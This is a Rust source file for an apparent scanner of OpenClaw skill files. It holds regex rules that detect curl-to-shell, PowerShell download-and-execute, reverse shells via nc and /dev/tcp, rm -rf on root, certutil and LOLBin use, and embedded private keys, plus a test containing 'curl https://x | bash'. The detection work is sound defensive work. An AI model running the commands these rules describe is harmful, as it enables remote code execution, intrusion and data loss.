use std::collections::HashSet;

use regex::Regex;

use crate::normalize::NormalizedLine;
use crate::types::{
    EvidenceKind, EvidenceNode, Finding, FindingConfidence, FindingSeverity, SkillLocation,
};

#[derive(Debug)]
pub struct PatternRule {
    pub id: &'static str,
    pub title: &'static str,
    pub category: &'static str,
    pub severity: FindingSeverity,
    pub confidence: FindingConfidence,
    pub hard_trigger: bool,
    pub pattern: &'static str,
    pub explanation: &'static str,
    pub remediation: &'static str,
}

pub fn baseline_rules() -> Vec<PatternRule> {
    vec![
        PatternRule {
            id: "baseline.curl_pipe_shell",
            title: "Remote download piped into shell",
            category: "execution",
            severity: FindingSeverity::Critical,
            confidence: FindingConfidence::High,
            hard_trigger: true,
            pattern: r"(?i)\b(?:curl|wget)\b[^\n]*(?:\||;)\s*(?:sh|bash)\b",
            explanation: "A remote download is piped directly into a shell.",
            remediation: "Remove direct download-to-shell execution and require a reviewed local script or pinned artifact.",
        },
        PatternRule {
            id: "baseline.invoke_expression_download",
            title: "PowerShell download executed with IEX",
            category: "execution",
            severity: FindingSeverity::Critical,
            confidence: FindingConfidence::High,
            hard_trigger: true,
            pattern: r"(?i)(?:\b(?:iwr|invoke-webrequest)\b.*\|\s*(?:iex|invoke-expression)\b|\b(?:iex|invoke-expression)\b.*(?:downloadstring|invoke-webrequest|new-object\s+net\.webclient))",
            explanation: "Downloaded content is being executed directly through PowerShell expression evaluation.",
            remediation: "Replace expression evaluation with reviewed local scripts or signed artifacts.",
        },
        PatternRule {
            id: "baseline.powershell_encoded_command",
            title: "Encoded PowerShell command",
            category: "obfuscation",
            severity: FindingSeverity::High,
            confidence: FindingConfidence::High,
            hard_trigger: false,
            pattern: r"(?i)\bpowershell(?:\.exe)?\b[^\n]*(?:-enc|-encodedcommand)\b",
            explanation: "The command relies on encoded PowerShell payloads, which reduces reviewability.",
            remediation: "Inline the reviewed script text or reference a checked-in script instead of an encoded blob.",
        },
        PatternRule {
            id: "baseline.rm_rf_root",
            title: "Destructive rm -rf against root path",
            category: "destructive",
            severity: FindingSeverity::Critical,
            confidence: FindingConfidence::High,
            hard_trigger: true,
            pattern: r"(?i)\brm\b[^\n]*-[^\n]*(?:r[^\n]*f|f[^\n]*r)[^\n]*(?:\s+/\s*$|\s+/\b)",
            explanation: "A destructive recursive removal command targets the filesystem root.",
            remediation: "Remove destructive filesystem commands from the skill or replace them with safe, bounded cleanup logic.",
        },
        PatternRule {
            id: "baseline.reverse_shell",
            title: "Reverse shell pattern",
            category: "execution",
            severity: FindingSeverity::Critical,
            confidence: FindingConfidence::High,
            hard_trigger: true,
            pattern: r"(?i)(?:nc\s+-e\s+/bin/(?:sh|bash)|bash\s+-i\b.*?/dev/tcp/|/dev/tcp/[^\s/]+/\d+)",
            explanation: "The content contains a reverse-shell style execution pattern.",
            remediation: "Remove remote shell patterns and replace them with bounded, reviewed local execution flows.",
        },
        PatternRule {
            id: "baseline.private_key_material",
            title: "Embedded private key material",
            category: "credential_exposure",
            severity: FindingSeverity::Critical,
            confidence: FindingConfidence::High,
            hard_trigger: true,
            pattern: r"-----BEGIN (?:RSA |DSA |EC |OPENSSH |PGP )?PRIVATE KEY-----",
            explanation: "Private key material appears inline in the scanned content.",
            remediation: "Remove private keys from the repository and rotate any exposed credentials.",
        },
        PatternRule {
            id: "baseline.certutil_decode_exec",
            title: "Certutil download or decode primitive",
            category: "execution",
            severity: FindingSeverity::High,
            confidence: FindingConfidence::Medium,
            hard_trigger: false,
            pattern: r"(?i)\bcertutil\b[^\n]*(?:-decode|-decodehex|-urlcache)\b",
            explanation: "Certutil is being used as a download or decode primitive.",
            remediation: "Avoid LOLBin-based download or decode chains and prefer transparent local artifacts.",
        },
        PatternRule {
            id: "baseline.lolbin_proxy_execution",
            title: "Windows LOLBin proxy execution",
            category: "execution",
            severity: FindingSeverity::High,
            confidence: FindingConfidence::Medium,
            hard_trigger: false,
            pattern: r"(?i)\b(?:mshta|regsvr32|rundll32)\b",
            explanation: "The content references common Windows proxy-execution binaries.",
            remediation: "Remove proxy-execution helpers and replace them with reviewed local executables or scripts.",
        },
        PatternRule {
            id: "baseline.base64_pipe_shell",
            title: "Decoded base64 content piped into shell",
            category: "obfuscation",
            severity: FindingSeverity::High,
            confidence: FindingConfidence::High,
            hard_trigger: true,
            pattern: r"(?i)\bbase64\b[^\n]*(?:-d|--decode)\b[^\n]*(?:\||;)\s*(?:sh|bash)\b",
            explanation: "Base64-decoded content is executed directly in a shell.",
            remediation: "Replace opaque decode-and-execute steps with checked-in reviewed scripts or pinned artifacts.",
        },
    ]
}

pub fn evaluate_rules(path: &str, lines: &[NormalizedLine]) -> Vec<Finding> {
    let rules = baseline_rules();
    let mut findings = Vec::new();
    let mut seen = HashSet::new();

    for rule in rules {
        let regex = Regex::new(rule.pattern).expect("baseline rule regex should compile");
        for line in lines {
            if !regex.is_match(&line.text) {
                continue;
            }

            let key = format!("{}:{}:{}", rule.id, line.start_line, line.text);
            if !seen.insert(key) {
                continue;
            }

            let excerpt = truncate_excerpt(&line.text, 200);
            let location = SkillLocation {
                path: path.to_string(),
                line: Some(line.start_line),
                column: None,
            };
            findings.push(Finding {
                id: rule.id.to_string(),
                title: rule.title.to_string(),
                category: rule.category.to_string(),
                severity: rule.severity,
                confidence: rule.confidence,
                hard_trigger: rule.hard_trigger,
                evidence_kind: "text_pattern".to_string(),
                location: Some(location.clone()),
                evidence: vec![EvidenceNode {
                    kind: EvidenceKind::TextPattern,
                    location,
                    excerpt,
                    direct: true,
                }],
                explanation: rule.explanation.to_string(),
                why_openclaw_specific: "This is a baseline scanner finding. OpenClaw-specific runtime modeling is deferred to Phase 4, but direct execution and credential exposure primitives still matter because skills can be installed and invoked inside real OpenClaw environments.".to_string(),
                prerequisite_context: vec!["The matched text appears in the scanned file content after normalization.".to_string()],
                analyst_notes: vec!["This rule is inherited baseline coverage and is intentionally kept separate from Phase 5 compound/path logic.".to_string()],
                remediation: rule.remediation.to_string(),
                suppression_status: "not_suppressed".to_string(),
            });
        }
    }

    findings
}

fn truncate_excerpt(text: &str, max_len: usize) -> String {
    if text.len() <= max_len {
        return text.to_string();
    }
    format!("{}...", &text[..max_len])
}

#[cfg(test)]
mod tests {
    use crate::normalize::build_scan_lines;

    use super::evaluate_rules;

    #[test]
    fn rules_detect_curl_pipe_shell() {
        let findings = evaluate_rules("SKILL.md", &build_scan_lines("curl https://x | bash"));
        assert!(findings.iter().any(|finding| finding.id == "baseline.curl_pipe_shell"));
    }

    #[test]
    fn rules_detect_private_key_material() {
        let findings = evaluate_rules(
            "SKILL.md",
            &build_scan_lines("-----BEGIN PRIVATE KEY-----\nAAAA\n-----END PRIVATE KEY-----"),
        );
        assert!(findings
            .iter()
            .any(|finding| finding.id == "baseline.private_key_material"));
    }
}
